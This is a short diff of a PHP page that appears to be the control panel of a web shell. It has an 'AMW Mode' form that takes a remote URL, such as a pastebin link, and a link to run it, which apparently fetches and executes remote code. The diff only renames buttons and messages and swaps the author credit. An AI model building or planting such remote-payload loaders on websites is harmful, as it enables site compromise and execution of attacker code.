@@ -704,7 +704,7 @@
     <form method="post">
         <label><b>⚡ AMW Mode Setup:</b></label>
         <input type="text" name="amw_url" placeholder="AMW URL (e.g., pastebin)" style="width:100%;max-width:600px;">
-        <button class="orange" type="submit" name="set_amw" value="1">✅ Set AMW Session</button>
+        <button class="orange" type="submit" name="set_amw" value="1">✅ RUN</button>
         <?php if(isset($_SESSION['URL'])): ?>
         <a href="?mode=amw" target="_blank" style="padding:10px;background:#28a745;color:white;text-decoration:none;border-radius:4px;">🚀 RUN AMW MODE</a>
         <?php endif; ?>
@@ -715,12 +715,12 @@
         $_SESSION['ready'] = true;
         $_SESSION['go'] = 1;
         echo "<div class='info'>";
-        echo "✅ <b>AMW Session SET!</b> ";
+        echo "✅ <b>READY BRO</b> ";
         echo "<a href='?mode=amw' target='_blank' style='color:#28a745;font-weight:bold;'>CLICK HERE → ?mode=amw</a>";
         echo "</div>";
     }
     ?>
 
     <div class="info">
-        <h4 style="text-align: center;"><span style="color: #016f56f0;">Copyright @ 2026 | Created By SEO - S•K</span></h4>
+        <h4 style="text-align: center;"><span style="color: #00b746;">Copyright @ 2026 | Created By TEAM - KJ</span></h4>
     </div>
